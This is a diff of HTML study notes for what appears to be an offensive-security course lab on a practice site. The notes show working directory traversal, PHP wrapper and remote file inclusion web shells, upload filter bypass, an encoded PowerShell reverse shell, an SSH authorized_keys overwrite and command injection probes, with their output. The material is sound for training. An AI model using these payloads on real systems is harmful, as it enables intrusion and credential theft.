@@ -340,7 +340,7 @@ Examining the Mountain Deserts web app.</p>
 <li>As soon as we&#39;ve identified a possible vulnerability, such as with the &quot;page&quot; parameter in this case, <strong>we should not rely on a browser for testing</strong>.</li>
 <li>We should mainly use tools such as Burp, cURL, or a programming language of our choice.</li>
 </ul>
-<pre><code>kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
+<pre><code class="language-bash">kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
 ...
 -----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
@@ -371,7 +371,7 @@ iRdp0z8X8E5NZxhHnarkQE2ZHyVTSf89NudDoXiWQXcadkyrIXxLofHPrQzPck2HvWhZVA
 </ul>
 </li>
 </ul>
-<pre><code>kali@kali:~$ ssh -i dt_key -p 2222 offsec@mountaindesserts.com
+<pre><code class="language-bash">kali@kali:~$ ssh -i dt_key -p 2222 offsec@mountaindesserts.com
 The authenticity of host &#39;[mountaindesserts.com]:2222 ([192.168.50.16]:2222)&#39; can&#39;t be established.
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 ...
@@ -423,7 +423,7 @@ kali@kali:~$ ssh -i dt_key -p 2222 offsec@mountaindesserts.com
 </ul>
 <h6>Directory Traversal Exercise Notes</h6>
 <p><strong>Linux Apache PHP Path Traversal</strong></p>
-<pre><code>┌──(kali㉿kali)-[~]
+<pre><code class="language-bash">┌──(kali㉿kali)-[~]
 └─$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../../etc/passwd
 &lt;!DOCTYPE html&gt;
 &lt;html&gt;
@@ -511,7 +511,7 @@ iRdp0z8X8E5NZxhHnarkQE2ZHyVTSf89NudDoXiWQXcadkyrIXxLofHPrQzPck2HvWhZVA
 ...
 </code></pre>
 <p>Save key, set perms, connect to host:</p>
-<pre><code>┌──(kali㉿kali)-[~]
+<pre><code class="language-bash">┌──(kali㉿kali)-[~]
 └─$ chmod 400 dt_rsa                                 
                                                                              
 ┌──(kali㉿kali)-[~]
@@ -522,7 +522,7 @@ offsec@5dfafd5c3dc3:~$ whoami
 offsec
 </code></pre>
 <p><strong>Grafana Windows Path traversal</strong></p>
-<pre><code>┌──(kali㉿kali)-[~]
+<pre><code class="language-bash">┌──(kali㉿kali)-[~]
 └─$ curl --path-as-is http://192.168.235.193:3000/public/plugins/alertlist/../../../../../../../../Users/install.txt
 OS{40fc8290aa5efda3d0a1c3eb5615dfac}
 </code></pre>
@@ -536,7 +536,7 @@ OS{40fc8290aa5efda3d0a1c3eb5615dfac}
 <ul>
 <li>In the &quot;Vulnerability Scanning&quot; topic, we scanned the SAMBA machine and identified a directory traversal vulnerability in Apache 2.4.49.1 This vulnerability can be exploited by using a relative path after specifying the cgi-bin directory in the URL.</li>
 </ul>
-<pre><code>kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/../../../../etc/passwd
+<pre><code class="language-bash">kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/../../../../etc/passwd
 
 &lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
 &lt;html&gt;&lt;head&gt;
@@ -571,7 +571,7 @@ kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/../../../../../../../
 </ul>
 </li>
 </ul>
-<pre><code>kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+<pre><code class="language-bash">kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -599,12 +599,12 @@ alfred:x:1000:1000::/home/alfred:/bin/bash
 </ul>
 <h6>Encoding Special Characters Exercises</h6>
 <p><strong>Apache cgi-bin path traversal with URL encoding</strong></p>
-<pre><code>┌──(kali㉿kali)-[~]
+<pre><code class="language-bash">┌──(kali㉿kali)-[~]
 └─$ curl --path-as-is http://192.168.235.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/passwords
 OS{4fc96513e5471612d0846a523a8d199e}
 </code></pre>
 <p><strong>Grafana with URL encoding</strong></p>
-<pre><code>┌──(kali㉿kali)-[~]
+<pre><code class="language-bash">┌──(kali㉿kali)-[~]
 └─$ curl --path-as-is http://192.168.235.16:3000/public/plugins/alertlist/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd 
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -693,7 +693,7 @@ OS{8267caf26dc5b6bb3876c10b9d8c28ef}
 </ul>
 </li>
 </ul>
-<pre><code>kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
+<pre><code class="language-bash">kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
 ...
 192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] &quot;GET /meteor/index.php?page=admin.php HTTP/1.1&quot; 200 2218 &quot;-&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0&quot;
 </code></pre>
@@ -1054,7 +1054,7 @@ OS{14b069b2a4b837e64c31d95d1da76910}
 </li>
 </ul>
 <p><strong>filter example</strong></p>
-<pre><code>kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=admin.php
+<pre><code class="language-bash">kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=admin.php
 ...
 &lt;a href=&quot;index.php?page=admin.php&quot;&gt;&lt;p style=&quot;text-align:center&quot;&gt;Admin&lt;/p&gt;&lt;/a&gt;
 &lt;!DOCTYPE html&gt;
@@ -1069,7 +1069,7 @@ OS{14b069b2a4b837e64c31d95d1da76910}
 </code></pre>
 <p>Note, body is not closed!!! We can assume exec code, such as php, follows.</p>
 <p>Include with filter.</p>
-<pre><code>kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
+<pre><code class="language-bash">kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
 ...
 &lt;a href=&quot;index.php?page=admin.php&quot;&gt;&lt;p style=&quot;text-align:center&quot;&gt;Admin&lt;/p&gt;&lt;/a&gt;
 &lt;!DOCTYPE html&gt;
@@ -1083,7 +1083,7 @@ OS{14b069b2a4b837e64c31d95d1da76910}
         &lt;span style=&quot;color:#F00;text-align:center;&quot;&gt;The admin page is currently under maintenance.
 </code></pre>
 <p>Same result as PHP is still executing, encode to base64 string to extract.</p>
-<pre><code>kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
+<pre><code class="language-bash">kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
 ...
 &lt;a href=&quot;index.php?page=admin.php&quot;&gt;&lt;p style=&quot;text-align:center&quot;&gt;Admin&lt;/p&gt;&lt;/a&gt;
 PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbn...
@@ -1091,7 +1091,7 @@ dF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRt
 ...
 </code></pre>
 <p>Copy string from output and decode in terminal.</p>
-<pre><code>kali@kali:~$ echo &quot;PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbnRlbmFuY2U8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgICAgIDw/cGhwIGVjaG8gJzxzcGFuIHN0eWxlPSJjb2xvcjojRjAwO3RleHQtYWxpZ246Y2VudGVyOyI+VGhlIGFkbWluIHBhZ2UgaXMgY3VycmVudGx5IHVuZGVyIG1haW50ZW5hbmNlLic7ID8+Cgo8P3BocAokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOwokdXNlcm5hbWUgPSAicm9vdCI7CiRwYXNzd29yZCA9ICJNMDBuSzRrZUNhcmQhMiMiOwoKLy8gQ3JlYXRlIGNvbm5lY3Rpb24KJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hbWUsICRwYXNzd29yZCk7CgovLyBDaGVjayBjb25uZWN0aW9uCmlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiAkY29ubi0+Y29ubmVjdF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K&quot; | base64 -d
+<pre><code class="language-bash">kali@kali:~$ echo &quot;PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEuMCI+CiAgICA8dGl0bGU+TWFpbnRlbmFuY2U8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgogICAgICAgIDw/cGhwIGVjaG8gJzxzcGFuIHN0eWxlPSJjb2xvcjojRjAwO3RleHQtYWxpZ246Y2VudGVyOyI+VGhlIGFkbWluIHBhZ2UgaXMgY3VycmVudGx5IHVuZGVyIG1haW50ZW5hbmNlLic7ID8+Cgo8P3BocAokc2VydmVybmFtZSA9ICJsb2NhbGhvc3QiOwokdXNlcm5hbWUgPSAicm9vdCI7CiRwYXNzd29yZCA9ICJNMDBuSzRrZUNhcmQhMiMiOwoKLy8gQ3JlYXRlIGNvbm5lY3Rpb24KJGNvbm4gPSBuZXcgbXlzcWxpKCRzZXJ2ZXJuYW1lLCAkdXNlcm5hbWUsICRwYXNzd29yZCk7CgovLyBDaGVjayBjb25uZWN0aW9uCmlmICgkY29ubi0+Y29ubmVjdF9lcnJvcikgewogIGRpZSgiQ29ubmVjdGlvbiBmYWlsZWQ6ICIgLiAkY29ubi0+Y29ubmVjdF9lcnJvcik7Cn0KZWNobyAiQ29ubmVjdGVkIHN1Y2Nlc3NmdWxseSI7Cj8+Cgo8L2JvZHk+CjwvaHRtbD4K&quot; | base64 -d
 &lt;!DOCTYPE html&gt;
 &lt;html lang=&quot;en&quot;&gt;
 &lt;head&gt;
@@ -1113,7 +1113,7 @@ $conn = new mysqli($servername, $username, $password);
 </code></pre>
 <p>Decoded data contains MySQL conn info!!!</p>
 <p><strong>data example</strong></p>
-<pre><code>kali@kali:~$ curl &quot;http://mountaindesserts.com/meteor/index.php?page=data://text/plain,&lt;?php%20echo%20system(&#39;ls&#39;);?&gt;&quot;
+<pre><code class="language-bash">kali@kali:~$ curl &quot;http://mountaindesserts.com/meteor/index.php?page=data://text/plain,&lt;?php%20echo%20system(&#39;ls&#39;);?&gt;&quot;
 ...
 &lt;a href=&quot;index.php?page=admin.php&quot;&gt;&lt;p style=&quot;text-align:center&quot;&gt;Admin&lt;/p&gt;&lt;/a&gt;
 admin.php
@@ -1127,7 +1127,7 @@ js
 </code></pre>
 <p>PHP snip with data wrapper shows output of <code>ls</code>.</p>
 <p>When web application firewalls or other security mechanisms are in place, they may filter strings like &quot;system&quot; or other PHP code elements. In such a scenario, we can try to use the data:// wrapper with base64-encoded data. We&#39;ll first encode the PHP snippet into base64, then use curl to embed and execute it via the data:// wrapper.</p>
-<pre><code>kali@kali:~$ echo -n &#39;&lt;?php echo system($_GET[&quot;cmd&quot;]);?&gt;&#39; | base64
+<pre><code class="language-bash">kali@kali:~$ echo -n &#39;&lt;?php echo system($_GET[&quot;cmd&quot;]);?&gt;&#39; | base64
 PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
 
 
@@ -1268,7 +1268,7 @@ system(&quot;sudo rsync -avzR /var/www/html/index.php /mnt/external/&quot;);
 &lt;/html&gt;
 </code></pre>
 <p>Follow the steps above and use the data:// PHP Wrapper in combination with the URL encoded PHP snippet we used in this section to execute the uname -a command on WEB18 (VM #1). Enter the Linux kernel version as answer.</p>
-<pre><code>GET /meteor/index.php?page=data://text/plain,&lt;?php%20echo%20system(&#39;uname%20-a&#39;);?&gt; HTTP/1.1
+<pre><code class="language-http">GET /meteor/index.php?page=data://text/plain,&lt;?php%20echo%20system(&#39;uname%20-a&#39;);?&gt; HTTP/1.1
 Host: mountaindesserts.com
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
@@ -1311,7 +1311,7 @@ Linux 3b51a43fad24 5.4.0-132-generic #148-Ubuntu SMP Mon Oct 17 16:02:06 UTC 202
 </ul>
 </li>
 </ul>
-<pre><code>kali@kali:/usr/share/webshells/php/$ cat simple-backdoor.php
+<pre><code class="language-bash">kali@kali:/usr/share/webshells/php/$ cat simple-backdoor.php
 ...
 &lt;?php
 if(isset($_REQUEST[&#39;cmd&#39;])){
@@ -1327,12 +1327,12 @@ Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
 ...
 </code></pre>
 <p>To leverage an RFI vulnerability, we need to make the remote file accessible by the target system.</p>
-<pre><code>kali@kali:/usr/share/webshells/php/$ python3 -m http.server 80
+<pre><code class="language-bash">kali@kali:/usr/share/webshells/php/$ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 </code></pre>
 <p>We could also use a publicly-accessible file, such as one from Github.</p>
 <p>Next, we&#39;ll use curl to include the hosted file via HTTP and specify ls as our command.</p>
-<pre><code>kali@kali:/usr/share/webshells/php/$ curl &quot;http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&amp;cmd=ls&quot;
+<pre><code class="language-bash">kali@kali:/usr/share/webshells/php/$ curl &quot;http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&amp;cmd=ls&quot;
 ...
 &lt;a href=&quot;index.php?page=admin.php&quot;&gt;&lt;p style=&quot;text-align:center&quot;&gt;Admin&lt;/p&gt;&lt;/a&gt;
 &lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&gt; 
@@ -1348,7 +1348,7 @@ js
 </code></pre>
 <h4>Remote File Inclusion (RFI) Exercises</h4>
 <p>Follow the steps from this section to leverage RFI to remotely include the /usr/share/webshells/php/simple-backdoor.php PHP file. Use the &quot;cmd&quot; parameter to execute commands on VM #1 and use the cat command to view the contents of the authorized_keys file in the /home/elaine/.ssh/ directory. The file contains one entry including a restriction for allowed commands. Find the flag specified as the value to the command parameter in this file.</p>
-<pre><code>└─$ curl &quot;http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.198/simple-backdoor.php&amp;cmd=ls&quot;
+<pre><code class="language-bash">└─$ curl &quot;http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.198/simple-backdoor.php&amp;cmd=ls&quot;
 
 ...
 &lt;a href=&quot;index.php?page=admin.php&quot;&gt;&lt;p style=&quot;text-align:center&quot;&gt;Admin&lt;/p&gt;&lt;/a&gt;
@@ -1500,14 +1500,14 @@ OS{60430fabfa02aa752791194b9591be5e}
 </li>
 </ul>
 <p>&quot;Mountain Desserts&quot; app, the Admin link has been replaced by an upload form. The text explains that we can upload a picture to win a contest. The tab bar also shows an XAMPP icon displayed in the current tab, indicating the web application is likely running the XAMPP stack. The text explains that the company wanted to switch to Windows, so we can assume that the web application is now running on a Windows system. Let&#39;s find out if we can upload a text file instead of an image.</p>
-<pre><code>kali@kali:~$ echo &quot;this is a test&quot; &gt; test.txt
+<pre><code class="language-bash">kali@kali:~$ echo &quot;this is a test&quot; &gt; test.txt
 </code></pre>
 <p>Success.</p>
 <p>Attempt to upload the simple-backdoor.php webshell used in the previous Learning Unit. Fails due to filter. Utilize trial and error approach.</p>
 <p>One method to bypass this filter is to change the file extension to a less-commonly used PHP file extension such as .phps or .php7. This may allow us to bypass simple filters that only check for the most common file extensions, .php and .phtml. These alternative file extensions were mostly used for older versions of PHP or specific use cases, but are still supported for compatibility in modern PHP versions.</p>
 <p>Another way we can bypass the filter is by changing characters in the file extension to upper case. The blacklist may be implemented by comparing the file extension of the uploaded file to a list of strings containing only lower-case PHP file extensions. If so, we can update the uploaded file extension with upper-case characters to bypass the filter.</p>
 <p>Let&#39;s try the second method, updating our simple-backdoor.php file extension from .php to .pHP. After renaming the file either in the terminal or file explorer, we&#39;ll upload it via the web form.</p>
-<pre><code>kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
+<pre><code class="language-bash">kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
 ...
  Directory of C:\xampp\htdocs\meteor\uploads
 
@@ -1520,7 +1520,7 @@ OS{60430fabfa02aa752791194b9591be5e}
 ...
 </code></pre>
 <p>PowerShell one-liner for rev shell, use PowerShell on our Kali machine to encode the reverse shell one-liner. First, let&#39;s create the variable $Text, which will be used for storing the reverse shell one-liner as a string. Then, we can use the method convert6 and the property Unicode from the class Encoding to encode the contents of the $Text variable.</p>
-<pre><code>kali@kali:~$ pwsh
+<pre><code class="language-bash">kali@kali:~$ pwsh
 PowerShell 7.1.3
 Copyright (c) Microsoft Corporation.
 
@@ -1543,12 +1543,12 @@ AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADs
 PS&gt; exit
 </code></pre>
 <p>As shown in Listing 32, the $EncodedText variable contains the encoded reverse shell one-liner. Let&#39;s use curl to execute the encoded one-liner via the uploaded simple-backdoor.pHP. We can add the base64 encoded string for the powershell command using the -enc parameter. We&#39;ll also need to use URL encoding for the spaces.</p>
-<pre><code>kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
+<pre><code class="language-bash">kali@kali:~$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
 ...
 AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
 </code></pre>
 <p>After executing the command, we should receive an incoming reverse shell in the second terminal where Netcat is listening.</p>
-<pre><code>kali@kali:~$ nc -nvlp 4444
+<pre><code class="language-bash">kali@kali:~$ nc -nvlp 4444
 listening on [any] 4444 ...
 connect to [192.168.119.3] from (UNKNOWN) [192.168.50.189] 50603
 ipconfig
@@ -1568,7 +1568,7 @@ nt authority\system
 </code></pre>
 <p>Below shows us the frameworks and languages for which Kali already offers web shells. It is important to understand that while the implementation of a web shell is dependent on the programming language, the basic process of using a web shell is nearly identical across these frameworks and languages. After we identify the framework or language of the target web application, we need to find a way to upload our web shell. The web shell needs to be placed in a location where we can access it. Next, we can provide commands to it, which are executed on the underlying system.</p>
 <p>We should be aware that the file types of our web shells may be blacklisted via a filter or upload mechanism. In situations like this, we can try to bypass the filter as in this section. However, there are other options to consider. Web applications handling and managing files often enable users to rename or modify files. We could abuse this by uploading a file with an innocent file type like .txt, then changing the file back to the original file type of the web shell by renaming it.</p>
-<pre><code>kali@kali:~$ ls -la /usr/share/webshells
+<pre><code class="language-bash">kali@kali:~$ ls -la /usr/share/webshells
 total 40
 drwxr-xr-x   8 root root  4096 Feb 11 02:00 .
 drwxr-xr-x 320 root root 12288 Apr 19 09:17 ..
@@ -1582,7 +1582,7 @@ drwxr-xr-x   3 root root  4096 Feb 11 01:58 php
 </code></pre>
 <h6>File Upload Vulnerabilities Exercises</h6>
 <p>Follow the steps above on VM #1 and exploit the file upload vulnerability. The flag is located in the C:\xampp\passwords.txt file as a password for the mountainadmin user.</p>
-<pre><code>┌──(kali㉿kali)-[~/webshells/ps]
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/webshells/ps]
 └─$ cat ps-one-liner.md 
 # PowerShell Encoded One-Liner Setup
 
@@ -1760,7 +1760,7 @@ Hello admin team. We needed to reset all passwords to OS{daa29e627253f9e95f252e0
 </li>
 </ul>
 <p>Example site no longer uses PHP.</p>
-<pre><code>kali@kali:~$ curl http://mountaindesserts.com:8000/index.php
+<pre><code class="language-bash">kali@kali:~$ curl http://mountaindesserts.com:8000/index.php
 404 page not found
 
 kali@kali:~$ curl http://mountaindesserts.com:8000/meteor/index.php
@@ -1770,7 +1770,7 @@ kali@kali:~$ curl http://mountaindesserts.com:8000/admin.php
 404 page not found
 </code></pre>
 <p>Test file upload with <code>test.txt</code> capture in Burp.</p>
-<pre><code>┌──(kali㉿kali)-[~]
+<pre><code class="language-bash">┌──(kali㉿kali)-[~]
 └─$ sudo nano /etc/hosts
 [sudo] password for kali: 
                                                                                                                                                            
@@ -1779,7 +1779,7 @@ kali@kali:~$ curl http://mountaindesserts.com:8000/admin.php
 </code></pre>
 <p>Successfully Uploaded File: test.txt</p>
 <p>Capture in Burp, send to Repeater, and test.</p>
-<pre><code>POST /upload HTTP/1.1
+<pre><code class="language-http">POST /upload HTTP/1.1
 Host: mountaindesserts.com:8000
 Content-Length: 189
 Cache-Control: max-age=0
@@ -1802,7 +1802,7 @@ test
 ------WebKitFormBoundaryk5HlB2iMWd4r74v2--
 </code></pre>
 <p>Same result as browser.</p>
-<pre><code>HTTP/1.1 200 OK
+<pre><code class="language-http">HTTP/1.1 200 OK
 Date: Sun, 27 Aug 2023 21:20:27 GMT
 Content-Length: 37
 Content-Type: text/plain; charset=utf-8
@@ -1811,7 +1811,7 @@ Connection: close
 Successfully Uploaded File: test.txt
 </code></pre>
 <p>Check if the web application allows us to specify a relative path in the filename and write a file via Directory Traversal outside of the web root. We can do this by modifying the &quot;filename&quot; parameter in the request so it contains ../../../../../../../test.txt, then click send.</p>
-<pre><code>POST /upload HTTP/1.1
+<pre><code class="language-http">POST /upload HTTP/1.1
 Host: mountaindesserts.com:8000
 Content-Length: 211
 Cache-Control: max-age=0
@@ -1834,7 +1834,7 @@ test
 ------WebKitFormBoundaryk5HlB2iMWd4r74v2--
 </code></pre>
 <p>Success.</p>
-<pre><code>HTTP/1.1 200 OK
+<pre><code class="language-http">HTTP/1.1 200 OK
 Date: Sun, 27 Aug 2023 21:24:52 GMT
 Content-Length: 58
 Content-Type: text/plain; charset=utf-8
@@ -1853,7 +1853,7 @@ Successfully Uploaded File: ../../../../../../../test.txt
 <p>Web applications using Apache, Nginx or other dedicated web servers often run with specific users, such as www-data on Linux. Traditionally on Windows, the IIS web server runs as a Network Service account, a passwordless built-in Windows identity with low privileges. Starting with IIS version 7.5, Microsoft introduced the IIS Application Pool Identities. These are virtual accounts running web applications grouped by application pools. Each application pool has its own pool identity, making it possible to set more precise permissions for accounts running web applications.</p>
 <p>When using programming languages that include their own web server, administrators and developers often deploy the web application without any privilege structures by running applications as root or Administrator to avoid any permissions issues. This means we should always verify whether we can leverage root or administrator privileges in a file upload vulnerability.</p>
 <p>Attempt to overwrite <code>authorized_keys</code> in the home of root. Create SSH keypair and authorized_keys file containing pub.</p>
-<pre><code>┌──(kali㉿kali)-[~/.ssh]
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/.ssh]
 └─$ ssh-keygen 
 Generating public/private rsa key pair.
 Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup
@@ -1880,7 +1880,7 @@ The key&#39;s randomart image is:
 └─$ cat fileup.pub &gt; ~/authorized_keys 
 </code></pre>
 <p>Prepare the request with burp, upload authorized_keys file and capture. Send to repeater and prepare to blind overwrite.</p>
-<pre><code>POST /upload HTTP/1.1
+<pre><code class="language-http">POST /upload HTTP/1.1
 Host: mountaindesserts.com:8000
 Content-Length: 768
 Cache-Control: max-age=0
@@ -1903,7 +1903,7 @@ ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCqr0PVNbEyQE/2ObXfuOA/R1A/MXbNLy0uu1ErLnLv
 ------WebKitFormBoundaryRHQaNDktHbJ3T2m0--
 </code></pre>
 <p>Success.</p>
-<pre><code>HTTP/1.1 200 OK
+<pre><code class="language-http">HTTP/1.1 200 OK
 Date: Sun, 27 Aug 2023 21:36:31 GMT
 Content-Length: 75
 Content-Type: text/plain; charset=utf-8
@@ -1912,7 +1912,7 @@ Connection: close
 Successfully Uploaded File: ../../../../../../../root/.ssh/authorized_keys
 </code></pre>
 <p>Connect via SSH.</p>
-<pre><code>┌──(kali㉿kali)-[~]
+<pre><code class="language-bash">┌──(kali㉿kali)-[~]
 └─$ ssh -i .ssh/fileup root@mountaindesserts.com -p 2222
 The authenticity of host &#39;[mountaindesserts.com]:2222 ([192.168.246.16]:2222)&#39; can&#39;t be established.
 ED25519 key fingerprint is SHA256:R2JQNI3WJqpEehY2Iv9QdlMAoeB3jnPvjJqqfDZ3IXU.
@@ -1957,339 +1957,357 @@ Navigate to http://192.168.220.189:8000, the MountainVault site is desinged to c
 - `git help` yeilds valid output, so we may be able to utilize all git commands.
 
 With curl;
+
+```bash
+kali@kali:~$ curl -X POST --data &#39;Archive=ipconfig&#39; http://192.168.50.189:8000/archive
+
+Command Injection detected. Aborting...%!(EXTRA string=ipconfig) 
 </code></pre>
-<p>kali@kali:~$ curl -X POST --data &#39;Archive=ipconfig&#39; <a href="http://192.168.50.189:8000/archive">http://192.168.50.189:8000/archive</a></p>
-<p>Command Injection detected. Aborting...%!(EXTRA string=ipconfig) </p>
-<pre><code>
-With Burp, running `git version` we find a Win box.
-</code></pre>
-<p>POST /archive HTTP/1.1
+<p>With Burp, running <code>git version</code> we find a Win box.</p>
+<pre><code class="language-http">POST /archive HTTP/1.1
 Host: 192.168.220.189:8000
 Content-Length: 19
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
-Origin: <a href="http://192.168.220.189:8000">http://192.168.220.189:8000</a>
+Origin: http://192.168.220.189:8000
 Content-Type: application/x-www-form-urlencoded
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,<em>/</em>;q=0.8,application/signed-exchange;v=b3;q=0.7
-Referer: <a href="http://192.168.220.189:8000/">http://192.168.220.189:8000/</a>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.220.189:8000/
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
-Connection: close</p>
-<p>Archive=git+version</p>
-<pre><code>
-This string is included in Win builds of git when run with `version` param.
+Connection: close
+
+Archive=git+version
 </code></pre>
-<p>HTTP/1.1 200 OK
+<p>This string is included in Win builds of git when run with <code>version</code> param.</p>
+<pre><code class="language-http">HTTP/1.1 200 OK
 Date: Sun, 27 Aug 2023 22:20:58 GMT
 Content-Length: 98
 Content-Type: text/plain; charset=utf-8
-Connection: close</p>
-<p>Repository successfully cloned with command: git version and output: git version 2.36.1.windows.1</p>
-<pre><code>
-Now that we know it runs Win, poke around.
+Connection: close
 
-- seperate multiple commands with `;`
-    - URL encode `%3B`
-- Can also delimit commands with `&amp;` and `&amp;&amp;` for bash/powershell
-    - NOTE Win CMD `&amp;`
+Repository successfully cloned with command: git version and output: git version 2.36.1.windows.1
 </code></pre>
-<p>POST /archive HTTP/1.1
+<p>Now that we know it runs Win, poke around.</p>
+<ul>
+<li>seperate multiple commands with <code>;</code><ul>
+<li>URL encode <code>%3B</code></li>
+</ul>
+</li>
+<li>Can also delimit commands with <code>&amp;</code> and <code>&amp;&amp;</code> for bash/powershell<ul>
+<li>NOTE Win CMD <code>&amp;</code></li>
+</ul>
+</li>
+</ul>
+<pre><code class="language-http">POST /archive HTTP/1.1
 Host: 192.168.220.189:8000
 Content-Length: 30
 Cache-Control: max-age=0
 Upgrade-Insecure-Requests: 1
-Origin: <a href="http://192.168.220.189:8000">http://192.168.220.189:8000</a>
+Origin: http://192.168.220.189:8000
 Content-Type: application/x-www-form-urlencoded
